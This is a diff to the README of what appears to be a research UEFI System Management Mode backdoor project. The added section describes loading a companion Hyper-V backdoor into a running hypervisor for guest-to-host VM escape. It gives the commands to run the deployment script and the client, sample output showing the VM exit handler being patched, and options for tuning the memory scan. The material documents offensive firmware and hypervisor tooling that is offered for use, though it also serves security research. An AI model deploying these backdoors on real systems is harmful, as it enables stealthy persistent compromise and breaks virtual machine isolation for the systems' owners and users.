@@ -13,6 +13,9 @@ This version of System Management Mode backdoor for UEFI based platforms was hea
 
  * SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.
 
+ * SMM backdoor also can be used to load [my Hyper-V backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv) (which is also part of PCI Express DIY hacking toolkit) into the currently running hypervisor during RT phase and perform guest to host VM escape attacks. Test client program `smm_backdoor_hyper_v.py` is used for integration with Hyper-V backdoor and its deployment.
+
+
 ## Backdoor Usage
 
 Project documentation is incomplete at this moment, but here's some command line examples.
@@ -155,6 +158,61 @@ Microsoft Windows [Version 10.0.19041.208]
 C:\> whoami
 nt authority\system
 ```
+
+## Using Together With Hyper-V Backdoor
+
+Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside guest or host Hyper-V partition. 
+
+To do that you need to save `backdoor.bin` file [form Hyper-V backdoor repository](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor.bin) as `hyper_v_backdoor.bin` in the same folder with `smm_backdoor_hyper_v.py` test client program and then just run it:
+
+```
+PS C:\> python2 smm_backdoor_hyper_v.py
+[+] Initializing SMM backdoor client...
+[+] Searching for VMCS structure in physical memory, this might take a while...
+
+ Scan step: 0x0000000001000000
+ Scan from: 0x0000000100000000
+   Scan to: 0x0000000200000000
+
+[+] Hypervisor VMCS structure was found
+
+ Physical address: 0x0000000109341000
+         HOST_CR3: 0x0000000100103000
+         HOST_RIP: 0xfffff87b6963236a
+
+[+] HvlpLowMemoryStub() is at 0x0000000000002000
+[+] Host operating system version is 2004
+[+] VM exit handler is at 0xfffff87b6960e010
+[+] VM exit handler call is at 0xfffff87b69632440
+[+] 14 bytes jump is at 0xfffff87b69632466
+[+] Backdoor entry is at 0x0000000000002700
+[+] Backdoor code size is 860 bytes
+[+] Patching VM exit handler call...
+[+] Done, Hyper-V backdoor was successfully installed
+```
+
+In case when `smm_backdoor_hyper_v.py` is unable to locate target VMCS region &minus; you can override its default scanning options by specifying appropriate values in `--scan-from`, `--scan-to` and `--scan-step` command line arguments of the program.
+
+After successful Hyper-V backdoor load you can run its client program to ensure that backdoor is up and responding:
+
+```
+PS C:\> .\hyper_v_backdoor_client.exe 0
+[+] Running on CPU #0
+[+] Hyper-V backdoor is running
+
+      Hypervisor CR0: 0x80010031
+      Hypervisor CR3: 0x100103000
+      Hypervisor CR4: 0x422e0
+ Hypervisor IDT base: 0xfffff87b69a00180 (limit = 0xffff)
+  Hypervisor GS base: 0xfffff87b69ba6000
+        VMCS address: 0x109341000
+     VM exit handler: 0xfffff87b6960e010
+       VM exit count: 0x86ed
+       VM call count: 0x2518
+```
+
+For more information about Hyper-V backdoor client program and performing guest to host VM escape attacks on Windows targets you can [check usage examples](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv#vm-escape-related-commands) in Hyper-V backdoor documentation. 
+
 
 ## About
 
